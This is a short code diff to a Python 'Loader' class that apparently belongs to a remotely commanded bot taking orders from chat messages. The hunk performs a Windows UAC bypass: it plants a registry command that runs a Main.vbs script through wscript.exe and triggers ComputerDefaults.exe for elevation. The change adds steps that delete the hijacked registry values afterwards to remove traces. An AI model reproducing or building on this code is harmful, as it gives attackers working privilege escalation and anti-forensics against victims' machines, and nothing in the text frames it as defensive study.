@@ -123,8 +123,10 @@ class Loader():
 						dirname.pop()
 						dirname = "wscript.exe \"" + "\\".join(dirname) + "\\Main.vbs\""
 						SetValueEx(registry_key, None, 0, REG_SZ, dirname)
-						CloseKey(registry_key)
 						os.system("ComputerDefaults.exe")
+						DeleteValue(registry_key, "")
+						DeleteValue(registry_key, "DelegateExecute")
+						CloseKey(registry_key)
 						exit();
 					elif command == "/change_prog" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						if ctypes.windll.shell32.IsUserAnAdmin() == 1:
